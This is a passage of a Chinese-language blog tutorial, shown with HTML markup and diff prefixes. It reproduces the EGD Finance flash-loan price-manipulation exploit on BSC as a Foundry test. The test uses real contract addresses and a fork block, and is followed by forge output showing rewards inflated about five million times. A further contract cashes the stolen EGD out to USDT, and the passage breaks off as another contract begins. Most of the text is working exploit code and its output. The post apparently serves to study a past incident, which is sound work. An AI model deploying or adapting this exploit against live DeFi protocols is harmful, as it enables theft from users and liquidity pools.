+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IPancakePair</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount0Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount1Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IEGD_Finance</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getEGDPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">calculateAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">bond</span><span class="p">(</span><span class="kt">address</span> <span class="n">invitor</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">stake</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">claimAllReward</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">EGD_Finance</span> <span class="o">=</span> <span class="mh">0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span> <span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">egd</span> <span class="o">=</span> <span class="mh">0x202b233735bF743FA31abb8f71e641970161bF98</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="k">constant</span> <span class="n">blockheight</span> <span class="o">=</span> <span class="mi">20245522</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">IPancakePair</span> <span class="k">constant</span> <span class="n">EGD_USDT_LPPool</span> <span class="o">=</span> <span class="n">IPancakePair</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa361433E409Adac1f87CDF133127585F8a93c67d</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">HackTest1</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IEGD_Finance</span> <span class="n">egd_finance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;https://rpc.ankr.com/bsc&#34;</span><span class="p">,</span> <span class="n">blockheight</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span> <span class="o">=</span> <span class="n">IEGD_Finance</span><span class="p">(</span><span class="n">EGD_Finance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="n">usdt</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">50000</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testHack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stake</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//模拟2天后
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;all edg in EGD_Finance:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">EGD_Finance</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;edg price before:&#34;</span><span class="p">,</span> <span class="n">egd_finance</span><span class="p">.</span><span class="n">getEGDPrice</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;egd i should reward by noraml case:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">egd_finance</span><span class="p">.</span><span class="n">calculateAll</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//贷款（价格操纵）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">99997600</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100000000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">EGD_USDT_LPPool</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">borrowUSDT</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;abcd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">stake</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">bond</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x85cbfaBD709c744C84A36BA47145396d724EE751</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">egd_finance</span><span class="p">),</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">stake</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//贷款的回调函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">count1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;edg price after (i borrowed huge USDT out):&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">egd_finance</span><span class="p">.</span><span class="n">getEGDPrice</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//在价格不合理的时候领取质押奖励
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//归还贷款本金 + 5%手续费
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">((</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_500_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;edg i get from the stake reward:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract HackTest1  -vv
+</span></span><span class="line"><span class="cl">[⠑] Compiling...
+</span></span><span class="line"><span class="cl">[⠢] Compiling 1 files with 0.8.17
+</span></span><span class="line"><span class="cl">[⠰] Solc 0.8.17 finished in 2.44s
+</span></span><span class="line"><span class="cl">Compiler run successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running 1 test for test/Hack.t.sol:HackTest1
+</span></span><span class="line"><span class="cl">[PASS] testHack() (gas: 909189)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  all edg in EGD_Finance: 5678872403240763806350000
+</span></span><span class="line"><span class="cl">  edg price before: 8096310933284567
+</span></span><span class="line"><span class="cl">  egd i should reward by noraml case: 1093999999999910400
+</span></span><span class="line"><span class="cl">  edg price after (i borrowed huge USDT out): 194311462398
+</span></span><span class="line"><span class="cl">  edg i get from the stake reward: 5630136207606302655330000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到, 我们本来只能领取EDG:  1093999999999910400  变成了  5630136207606302655330000, 放大了500万倍.</p>
+<h3 id="将获利兑换为usdt进行套现">将获利兑换为USDT进行套现</h3>
+<p>我这里为了让逻辑更清晰, 新建一个合约专门用于USDT兑换:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Egd2USDT</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap2usdt</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//将egd兑换成usdt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">egd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">usdt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pancakeRouter</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pancakeRouter</span><span class="p">.</span><span class="n">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中</p>
+<p><code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code>函数是<a href="https://docs.pancakeswap.finance/code/smart-contracts/pancakeswap-exchange/v2/router-v2#swapexacttokensfortokenssupportingfeeontransfertokens" target="_blank" rel="noopener noreffer ">PancakeSwap</a>的一个交易函数，用于在两个代币之间进行兑换。</p>
+<ul>
+<li><code>amountIn</code>：输入代币数量；</li>
+<li><code>amountOutMin</code>：输出代币数量的下限，防止交易价格波动过大导致交易失败；</li>
+<li><code>path</code>：一个代币路径数组，表示交易的路径；</li>
+<li><code>to</code>：输出代币的接收地址；</li>
+<li><code>deadline</code>：交易截止时间，超过此时间交易将失败。</li>
+</ul>
+<p>path 参数是一个长度至少为 2 的地址数组，用于指定交易路径。</p>
+<p>具体来说，如果我们想要在 PancakeSwap 上进行 A 代币与 B 代币之间的兑换，那么我们需要指定一个交易路径，例如：</p>
+<ul>
+<li>如果直接存在 A/B 交易对，则 path 数组为 [address(A), address(B)]。</li>
+<li>如果不存在 A/B 交易对，但存在 A/C 和 C/B 交易对，则 path 数组为 [address(A), address(C), address(B)]。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IPancakePair</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount0Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount1Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
